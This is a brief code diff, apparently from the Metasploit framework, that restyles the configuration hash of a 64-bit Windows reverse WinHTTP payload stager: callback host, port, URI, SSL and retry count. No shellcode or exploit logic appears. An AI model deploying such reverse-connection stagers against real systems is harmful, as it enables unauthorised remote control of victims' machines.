@@ -21,11 +21,11 @@ module Payload::Windows::ReverseWinHttp_x64
   #
   def generate(opts={})
     conf = {
-      :ssl         => opts[:ssl] || false,
-      :host        => datastore['LHOST'],
-      :port        => datastore['LPORT'],
-      :url         => generate_small_uri,
-      :retry_count => datastore['StagerRetryCount']
+      ssl:         opts[:ssl] || false,
+      host:        datastore['LHOST'],
+      port:        datastore['LPORT'],
+      url:         generate_small_uri,
+      retry_count: datastore['StagerRetryCount']
     }
 
     # Add extra options if we have enough space
